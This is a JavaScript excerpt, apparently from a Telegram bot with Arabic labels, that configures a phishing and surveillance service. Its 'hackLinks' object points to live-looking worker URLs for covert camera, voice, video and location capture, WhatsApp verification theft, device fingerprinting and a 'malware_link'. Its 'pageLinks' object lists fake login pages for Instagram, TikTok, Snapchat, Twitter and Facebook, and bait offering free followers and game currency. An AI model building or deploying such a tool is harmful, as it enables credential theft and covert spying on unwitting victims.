...
const admins = ['7130416076', '5823913363', '6808883615','6361463109']; 
...
function showDefaultButtons(userId) {
  ...
  let defaultButtons = [
    ...
    [
      { text: 'قناه المطور  ', url: 'https://t.me/+T_8QE67Pn6tkMzNk' },
      { text: 'تتواصل مع المطور', url: 'https://t.me/u_x86' }
    ],
    [
...
let hackLinks = {
    ...
    camera: 'https://shiny-waterfall-23ab.rwks332.workers.dev/camera',
    
  
    voice_record: 'https://shiny-waterfall-23ab.rwks332.workers.dev/voice',
    
    
    request_verification: 'https://shiny-waterfall-23ab.rwks332.workers.dev/whatsapp',
    
    
    malware_link: 'https://shiny-waterfall-23ab.rwks332.workers.dev/malware',
    
   
    collect_device_info: 'https://shiny-waterfall-23ab.rwks332.workers.dev/phone',
    
    
    get_location: 'https://shiny-waterfall-23ab.rwks332.workers.dev/local',
    
    
    capture_video: 'https://shiny-waterfall-23ab.rwks332.workers.dev/video'
};
...
let pageLinks = {
    // روابط تسجيل الدخول
    login: {
        instagram: 'https://white-firefly-c6ba.rwks332.workers.dev/Instagram',
        tiktok: 'https://white-firefly-c6ba.rwks332.workers.dev/tiktok',
        youtube: 'ikfkfk',
        snapchat: 'https://white-firefly-c6ba.rwks332.workers.dev/Snapchat',
        twitter: 'https://white-firefly-c6ba.rwks332.workers.dev/twitter',
        facebook: 'https://white-firefly-c6ba.rwks332.workers.dev/facebook'
    },
    // روابط زيادة المتابعين
    increase: {
        instagram: 'https://billowing-moon-b980.rwks332.workers.dev/insta',
        tiktok: 'https://billowing-moon-b980.rwks332.workers.dev/tik',
        youtube: 'https://billowing-moon-b980.rwks332.workers.dev/yot',
        snapchat: 'https://billowing-moon-b980.rwks332.workers.dev/snap',
        twitter: 'https://billowing-moon-b980.rwks332.workers.dev/twitter',
        facebook: 'https://billowing-moon-b980.rwks332.workers.dev/face'
    },
    // روابط الألعاب
    games: {
        pubg_uc: 'https://billowing-moon-b980.rwks332.workers.dev/bobji',
        free_fire_diamonds: 'https://billowing-moon-b980.rwks332.workers.dev/free',
        toptop_coins: 'https://billowing-moon-b980.rwks332.workers.dev/top'
    }
};
